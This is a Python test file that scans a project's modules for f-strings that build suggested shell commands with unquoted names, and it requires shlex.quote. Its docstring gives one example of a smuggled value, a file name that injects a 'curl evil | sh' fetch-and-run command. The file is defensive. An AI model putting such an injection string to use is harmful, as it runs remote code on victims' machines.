"""Commands we suggest people paste must not interpolate raw names.

File names, launchd labels, process names and account names are chosen by
whoever created them, malware included. An f-string like
f"rm -rf '{path}'" turns a file named "x'; curl evil | sh; '" into a
command the person runs themselves. Values after a command word must go
through shlex.quote (or be an integer, like a pid).
"""
import ast
import re
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

# A command starts a line (after indentation or a "1." bullet), follows a
# backtick, or follows "run:" / "with:" style prompts.
_COMMAND = re.compile(
    r"(?:^\s*(?:\d+[.)]\s*)?|`|:\s)(sudo|chmod|chown|rm|launchctl|kextunload|killall|"
    r"systemctl|journalctl|visudo|passwd|usermod|lastlog|schtasks|net share)\s",
    re.MULTILINE,
)
_SAFE_CALLS = {"quote", "int", "len"}


def _is_safe(value: ast.expr) -> bool:
    if isinstance(value, ast.Call):
        name = getattr(value.func, "id", getattr(value.func, "attr", ""))
        return name in _SAFE_CALLS
    return False


def _unsafe_interpolations(src: str):
    """Yield (line, expr) for values interpolated into a suggested command."""
    for node in ast.walk(ast.parse(src)):
        if not isinstance(node, ast.JoinedStr):
            continue
        line = ""  # text of the current output line so far
        for part in node.values:
            if isinstance(part, ast.Constant) and isinstance(part.value, str):
                line = (line + part.value).rsplit("\n", 1)[-1]
            elif isinstance(part, ast.FormattedValue):
                m = None
                for m in _COMMAND.finditer(line):
                    pass
                # A backtick closed after the command ends it: `launchctl unload` on {x}
                in_command = m is not None and not (
                    line[m.start()] == "`" and "`" in line[m.end():]
                )
                if in_command and not _is_safe(part.value):
                    yield node.lineno, ast.unparse(part.value)
                line += "x"


def test_suggested_commands_quote_untrusted_values():
    problems = []
    for path in sorted((ROOT / "modules").rglob("*.py")):
        for line, expr in _unsafe_interpolations(path.read_text(encoding="utf-8")):
            problems.append(f"{path.relative_to(ROOT)}:{line}: {{{expr}}}")
    assert not problems, "Quote these with shlex.quote:\n" + "\n".join(problems)
